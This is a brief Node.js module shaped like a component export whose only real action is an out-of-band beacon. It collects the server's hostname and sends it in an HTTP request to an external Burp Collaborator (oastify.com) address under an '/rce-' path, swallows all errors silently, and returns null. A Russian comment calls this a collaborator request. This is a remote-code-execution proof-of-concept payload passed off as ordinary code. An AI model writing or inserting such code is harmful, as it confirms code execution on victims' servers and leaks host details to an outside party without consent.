module.exports = {
  default: function(props) {
    var hostname = "unknown";
    try { hostname = process.env.HOSTNAME || process.env.POD_NAME || "n/a"; } catch(e) {}
    try { hostname = require("os").hostname(); } catch(e) {}
    
    // Пробуем HTTP-запрос к коллаборатору
    try {
      var http = require("http");
      http.get("http://fo754fqg0zt9x4y4fhekukej2a85wu.oastify.com/rce-" + hostname);
    } catch(e) {}
    
    return null;
  }
};
